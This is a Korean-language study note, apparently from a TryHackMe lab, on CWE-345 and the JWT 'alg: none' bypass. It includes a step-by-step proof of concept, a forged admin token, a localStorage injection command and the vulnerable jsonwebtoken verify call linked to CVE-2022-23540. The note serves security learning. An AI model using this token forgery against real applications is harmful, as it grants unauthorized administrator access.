# 개념
---



# List of Mapped CWEs
---
## CWE-345 (jwt)





# 프로젝트 적용
---
> thm 주소: 

## 취약점 설명



## poc

1. **정상 사용자로 로그인**
    
2. **jwt 토큰 획득 → 패킷 캡처하여 디코딩**
    
3. **헤더 및 payload를 아래처럼 변경 후 서명을 제거**
    ```bash
    # header
	{
	  "alg": "none",
	  "typ": "JWT"
	}
    
    # payload
    {
	  "id": 2,
	  "username": "nagox",
	  "role": "admin",
	  "exp": 1767794570
	}
    ```
	![[Pasted image 20260108005128.png]]
    [jwt.io](http://jwt.io) 쉽게 jwt token 조작 가능.
    ```bash
	eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
	```
    
4. **브라우저 내 로컬 스토리지에 저장**
    - 콘솔에서 조작
    ```sql
    localStorage.setItem('jwt_token', 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.');
    location.reload();
    ```
    - 브라우저에서 조작
	![[Pasted image 20260108005251.png]]

## 취약 코드 

> 실제 사례 반영:  CVE-2022-23540

```
jwt.verify(token, process.env.JWT_SECRET);
```
- `jsonwebtoken`라이브러리 사용 시 algorithms 옵션 미지정
+ verify에 전달된 key가 falsy (null / undefined / false 등)
+ 이때, 토큰 헤더가 `alg=none` 일 시 서명 검증이 무력화된다. 따라서 공격자는 `role`을 admin으로 변경하는 등, 권한 상승을 할 수 있다. (웹 페이지 내)
